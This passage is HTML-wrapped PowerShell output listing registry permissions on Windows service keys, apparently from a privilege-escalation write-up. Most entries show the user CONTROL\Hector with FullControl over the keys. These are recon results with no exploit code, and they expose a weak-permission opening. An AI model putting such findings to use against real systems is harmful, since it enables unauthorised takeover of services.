ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppID</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppID</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppIDSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppIDSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Appinfo</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Appinfo</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\applockerfltr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\applockerfltr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppMgmt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppMgmt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppReadiness</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppReadiness</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppVClient</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppVClient</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppvStrm</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppvStrm</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppvVemgr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppvVemgr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppvVfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppvVfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppXSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppXSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\arcsas</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\arcsas</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AsyncMac</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AsyncMac</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\atapi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\atapi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AudioEndpointBuilder</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AudioEndpointBuilder</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Audiosrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Audiosrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AxInstSV</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AxInstSV</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\b06bdrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\b06bdrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bam</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bam</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BasicDisplay</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BasicDisplay</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BasicRender</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BasicRender</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BattC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BattC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bcmfn2</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bcmfn2</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Beep</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Beep</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bfadfcoei</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bfadfcoei</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bfadi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bfadi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BFE</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BFE</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bindflt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bindflt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BITS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BITS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bowser</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bowser</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BrokerInfrastructure</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BrokerInfrastructure</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BTAGService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BTAGService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BthAvctpSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BthAvctpSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BthEnum</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BthEnum</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BthLEEnum</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BthLEEnum</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BthMini</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BthMini</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BTHPORT</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BTHPORT</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bthserv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bthserv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BTHUSB</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\BTHUSB</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bttflt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bttflt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\buttonconverter</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\buttonconverter</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bxfcoe</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bxfcoe</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bxois</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\bxois</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\camsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\camsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CapImg</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CapImg</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\CaptureService_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\cbdhsvc_ee306</span><br><span class="line">PSParentPath            : 